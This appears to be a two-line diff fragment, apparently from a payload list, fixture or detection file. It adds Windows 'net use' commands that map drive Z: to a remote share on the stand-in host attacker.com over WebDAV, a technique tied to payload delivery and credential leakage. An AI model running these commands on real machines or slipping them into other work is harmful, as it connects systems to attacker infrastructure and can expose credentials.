@@ -1,0 +1,2 @@
+net use Z: \\attacker.com@80\share
+net use Z:"http://attacker.com/share"
